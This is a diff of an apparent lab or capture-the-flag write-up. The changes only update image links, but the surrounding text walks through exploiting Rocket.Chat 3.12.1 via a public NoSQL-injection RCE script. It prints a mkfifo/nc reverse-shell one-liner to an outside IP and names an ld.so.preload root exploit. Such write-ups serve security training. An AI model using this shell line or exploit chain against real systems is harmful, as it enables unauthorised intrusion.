@@ -20,7 +20,7 @@ PORT     STATE SERVICE
 
 Port 3000 hosted an instance of Rocket Chat:
 
-![](<../../../.gitbook/assets/image%20(722).png>)
+![](../../../.gitbook/assets/chatty-7.png)
 
 We can enumerate the version by visiting the `/api/info` page:
 
@@ -46,17 +46,17 @@ Rocket.Chat 3.12.1 - NoSQL Injection to RCE (Unauthenticat | linux/webapps/50108
 
 I registered a new account and found the administrator profile of this instance:
 
-![](<../../../.gitbook/assets/image%20(555).png>)
+![](../../../.gitbook/assets/chatty-6.png)
 
 We can use `50108.py` to exploit this. Since we created our own low priv user, we can comment the part of the script that resets the low priv user's password:
 
-![](<../../../.gitbook/assets/image%20(1867).png>)
+![](../../../.gitbook/assets/chatty-1.png)
 
 Then, we also need to change the `password` of the low priv user to the one that we used.
 
-![](<../../../.gitbook/assets/image%20(3007).png>)
+![](../../../.gitbook/assets/chatty-4.png)
 
-![](<../../../.gitbook/assets/image%20(191).png>)
+![](../../../.gitbook/assets/chatty-2.png)
 
 After running the exploit, we would be given RCE access, and getting a reverse shell is pretty simple:
 
@@ -74,7 +74,7 @@ CMD:> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.184 21 >/tmp
 {"success":false}
 ```
 
-![](<../../../.gitbook/assets/image%20(196).png>)
+![](../../../.gitbook/assets/chatty-3.png)
 
 ## Privilege Escalation
 
@@ -109,6 +109,6 @@ There are online exploits on Github to make this process as easy as possible:
 
 I used `exploit.ldpreload.sh` and ran it on the machine. This would spawn a binary `sh` within `/var/tmp` that would give us a `root` shell.
 
-![](<../../../.gitbook/assets/image%20(526).png>)
+![](../../../.gitbook/assets/chatty-5.png)
 
 Rooted!
